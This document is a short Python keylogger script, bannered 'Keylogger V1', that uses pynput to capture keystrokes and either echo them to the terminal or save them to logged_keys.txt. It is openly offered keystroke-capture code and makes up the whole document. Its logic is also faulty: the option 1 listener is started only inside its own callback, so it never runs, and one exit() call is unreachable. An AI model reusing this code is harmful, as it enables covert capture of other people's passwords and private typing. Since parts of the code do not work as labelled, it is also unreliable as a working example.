from pynput import keyboard
from colorama import Fore,Style, init

import time

keys = []
ascii_text = r'''
    __ __              __                                 _    __   ___
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____| |  / /  <  /
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/| | / /   / / 
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /    | |/ /_  / /  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/     |___/(_)/_/   
            /____/           /____/ /____/                             
            
'''

init(autoreset=True)

print(Fore.RED + ascii_text)

print(Fore.BLUE + 'SELECT OPTION PLEASE!')
option1 = print(Fore.BLUE+'1. Local key reader (only return keys which you pressed)')
option2 = print(Fore.BLUE+'2. Convert the logged keys in .txt format')

selection = input('select option: ')

def LocalKeyLogger(key):
    print(key , 'press esc to leave')
    if key == keyboard.Key.esc:
            print('leaving...')
            exit()
    if selection == str(1):
        with keyboard.Listener(on_press=LocalKeyLogger) as listener:
                listener.join()


def convertToTxt(key):
        keys.append(str(key))
        print(key)
        file_path = 'logged_keys.txt'
        if key == keyboard.Key.esc:
            print('SHUTTING DOWN THE PROCCES -> logged_keys.txt')
            time.sleep(2)
            with open(file = file_path, mode = 'w') as file:
                file.write(' '.join(keys))
            return False
            exit()

if selection == str(2):
    with keyboard.Listener(on_press=convertToTxt) as listener:
        listener.join()
